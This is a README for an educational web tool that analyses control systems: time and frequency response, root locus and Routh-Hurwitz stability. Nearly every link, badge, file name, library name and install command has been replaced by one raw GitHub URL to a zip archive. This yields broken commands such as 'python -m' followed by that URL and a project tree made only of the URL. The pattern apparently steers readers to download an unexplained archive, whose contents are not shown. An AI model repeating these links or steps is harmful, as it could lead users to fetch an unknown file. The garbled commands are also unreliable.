# 🎛️ Advanced Control System Analyzer

An interactive web-based tool for analyzing and visualizing control system responses. Built to help students understand fundamental control system concepts through visual demonstrations.

![Control System Analyzer](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip%20Systems-Educational%20Tool-purple)
![HTML5](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)
![JavaScript](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)
![Plotly](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)

## 📚 Overview

This tool provides interactive analysis of control systems including:
- **Time Domain Analysis** - Step, Ramp, Impulse, Parabolic, and Sinusoidal responses
- **Frequency Domain Analysis** - Bode plots, Nyquist plots, Polar plots
- **Root Locus Analysis** - Visualize pole movement as gain varies
- **Stability Analysis** - Routh-Hurwitz criterion and Hurwitz determinants

## ✨ Features

### Time Response Analysis
| Feature | Description |
|---------|-------------|
| First-Order Systems | G(s) = K / (τs + 1) |
| Second-Order Systems | G(s) = Kωn² / (s² + 2ζωns + ωn²) |
| Higher-Order Systems | Custom numerator/denominator polynomials |
| Input Types | Step, Ramp, Parabolic, Impulse, Sinusoidal |

### Calculated Parameters
**Time Domain:**
- Delay Time (Td) - Time to reach 50% of final value
- Rise Time (Tr) - Time from 10% to 90% of final value
- Peak Time (Tp) - Time to reach maximum overshoot
- Settling Time (Ts) - Time to stay within 2% of final value
- Maximum Overshoot (Mp) - Percentage overshoot
- Steady-State Error (Ess) - Difference between input and output

**Frequency Domain:**
- Gain Margin (GM) - Extra gain before instability
- Phase Margin (PM) - Extra phase lag before instability
- Gain Crossover Frequency (ωgc)
- Phase Crossover Frequency (ωpc)
- Bandwidth (ωb)
- Resonant Peak (Mr)
- Corner Frequencies

### Stability Analysis
- **Routh-Hurwitz Array** - Visual table with sign change detection
- **Hurwitz Matrix** - Principal minors calculation
- **Pole-Zero Map** - Visual representation of system poles and zeros
- **BIBO Stability** - Bounded-Input Bounded-Output analysis

## 🚀 Getting Started

### Prerequisites
- A modern web browser (Chrome, Firefox, Safari, Edge)
- A local development server (optional, but recommended)

### Installation

1. **Clone or download the repository:**
   ```bash
   git clone https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
   cd control-system-analyzer
   ```

2. **Open with a local server:**
   
   Using VS Code Live Server:
   - Install the "Live Server" extension
   - Right-click on `https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip` → "Open with Live Server"
   
   Or using Python:
   ```bash
   python -m https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip 5500
   ```
   
   Or using https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
   ```bash
   npx serve .
   ```

3. **Open in browser:**
   ```
   https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
   ```

## 📖 Usage Guide

### Time Response Analysis

1. Select **System Order**: First-Order, Second-Order, or Higher-Order
2. Enter system parameters:
   - **First-Order**: Gain (K), Time Constant (τ)
   - **Second-Order**: Gain (K), Natural Frequency (ωn), Damping Ratio (ζ)
   - **Higher-Order**: K, Numerator coefficients, Denominator coefficients
3. Select **Input Type**: Step, Ramp, Parabolic, Impulse, or Sinusoidal
4. Click **"Analyze Time Response"**

### Frequency Response Analysis

1. Select **System Order** and enter parameters
2. Choose **Plot Type**:
   - **Bode Plot** - Magnitude and Phase vs Frequency
   - **Nyquist Plot** - Polar plot of G(jω)
   - **Polar Plot** - Similar to Nyquist
   - **Root Locus** - Pole movement vs Gain
3. Set frequency range (default: 0.1 to 100 rad/s)
4. Click **"Analyze Frequency / Root Locus"**

### Stability Criteria

1. Enter the **characteristic polynomial** coefficients
2. Click **"Generate Stability Tables"**
3. View:
   - Routh Array with sign change analysis
   - Hurwitz Matrix with principal minors

## 🎓 Control System Concepts

### Second-Order System Response Categories

| Damping Ratio (ζ) | System Type | Behavior |
|-------------------|-------------|----------|
| ζ < 1 | Underdamped | Oscillates before settling |
| ζ = 1 | Critically Damped | Fastest settling, no overshoot |
| ζ > 1 | Overdamped | Slow response, no oscillation |

### Stability Margins

- **Gain Margin**: How much gain can be increased before instability
  - GM > 0 dB → Stable
  - GM = ∞ → Phase never reaches -180° (unconditionally stable for gain)
  
- **Phase Margin**: How much phase lag can be added before instability
  - PM > 45° → Well-damped response
  - PM > 30° → Acceptable damping
  - PM < 30° → Poor damping, oscillatory

### Routh-Hurwitz Stability Criterion

A system is **stable** if and only if:
1. All coefficients of the characteristic polynomial are positive
2. All elements in the first column of the Routh array are positive
3. No sign changes occur in the first column

## 📁 Project Structure

```
control-system-analyzer/
├── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip      # Main HTML structure
├── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip      # Dark theme styling with glassmorphism
├── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip       # All control system calculations and plotting
└── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip       # This file
```

## 🛠️ Technologies Used

- **HTML5** - Structure
- **CSS3** - Modern dark theme with glassmorphism effects
- **JavaScript (ES6+)** - Control system calculations
- **https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip** - Interactive chart plotting
- **MathJax** - Mathematical formula rendering
- **https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip** - Complex number operations

## 📐 Formulas Implemented

### Time Response Formulas

**Second-Order Step Response (Underdamped):**
```
c(t) = K[1 - (e^(-ζωnt) / √(1-ζ²)) × sin(ωd×t + φ)]
where φ = atan(√(1-ζ²) / ζ) and ωd = ωn√(1-ζ²)
```

**Time Domain Specifications:**
```
Rise Time:    Tr ≈ (1.8) / ωn  (for ζ = 0.5)
Peak Time:    Tp = π / ωd
Settling Time: Ts ≈ 4 / (ζωn)  (2% criterion)
Overshoot:    Mp = e^(-πζ/√(1-ζ²)) × 100%
```

### Frequency Response Formulas

**Gain Margin:**
```
GM = -20 log₁₀|G(jωpc)|  where ∠G(jωpc) = -180°
```

**Phase Margin:**
```
PM = 180° + ∠G(jωgc)  where |G(jωgc)| = 1 (0 dB)
```

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

## 📄 License

This project is open source and available under the [MIT License](LICENSE).

## 🙏 Acknowledgments

- Control system formulas based on standard textbooks:
  - Ogata, K. "Modern Control Engineering"
  - Nise, N. "Control Systems Engineering"
  - Dorf, R. & Bishop, R. "Modern Control Systems"
- Built with [https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip) for interactive charts
- Mathematical rendering by [MathJax](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)

## 📞 Support

If you encounter any issues or have questions:
1. Check the existing issues on GitHub
2. Create a new issue with detailed description
3. Include browser console errors if applicable

---

**Made with ❤️ for Control Systems Students**
